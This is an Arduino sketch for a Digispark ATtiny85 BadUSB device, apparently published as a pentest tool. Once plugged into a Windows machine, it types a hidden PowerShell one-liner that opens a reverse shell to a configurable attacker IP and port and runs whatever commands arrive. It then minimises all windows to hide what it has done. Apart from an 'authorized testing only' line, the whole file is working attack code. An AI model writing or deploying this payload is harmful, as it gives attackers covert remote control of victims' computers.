 /*
   * Digispark ATtiny85 — PowerShell Reverse Shell
   * Author: Akshay G Babu
   * License: MIT
   *
   * Hardware: Digispark Rev 3 (ATtiny85, 16.5 MHz)
   * Target: Windows 10/11 (PowerShell 5.1+)
   *
   * Usage:
   *   1. Set LHOST/LPORT below
   *   2. Upload to Digispark
   *   3. Plug into target — executes in ~15 seconds
   *
   * ⚠️ FOR AUTHORIZED TESTING ONLY
   */

  #include "DigiKeyboard.h"

  // ==================== CONFIG ====================
  #define LHOST "192.168.1.100"   // CHANGE TO YOUR IP
  #define LPORT "4444"             // CHANGE TO YOUR PORT
  #define DELAY_INIT 2000          // Initial delay (ms)
  #define DELAY_CMD 500            // Between commands
  #define DELAY_EXEC 3000          // Execution time

  // ==================== PAYLOAD ====================
  void setup() {
    // Wait for driver enumeration
    DigiKeyboard.delay(DELAY_INIT);

    // Open Run dialog (Win+R)
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(DELAY_CMD);

    // PowerShell reverse shell (one-liner)
    // Encoded to avoid quoting issues
    String payload =
      "powershell -w hidden -nop -c \"$c=New-Object Net.Sockets.TCPClient('"
      + String(LHOST) + "','" + String(LPORT) + "');"
      + "$s=$c.GetStream();"
      + "[byte[]]$b=0..65535|%{0};"
      + "while(($i=$s.Read($b,0,$b.Length))-ne 0){;"
      + "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
      + "$sb=(iex $d 2>&1|Out-String);"
      + "$sb2=$sb+'PS '+(pwd).Path+'> ';"
      + "$s.Write((New-Object Text.ASCIIEncoding).GetBytes($sb2),0,$sb2.Length)}"
      + "\"";

    DigiKeyboard.print(payload);
    DigiKeyboard.delay(DELAY_CMD);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // Optional: Minimize window to hide
    DigiKeyboard.delay(DELAY_EXEC);
    DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT);  // Win+M minimize all
  }

  void loop() {
    // Blink LED to indicate completion
    digitalWrite(1, HIGH);
    DigiKeyboard.delay(500);
    digitalWrite(1, LOW);
    DigiKeyboard.delay(500);
  }

  ---
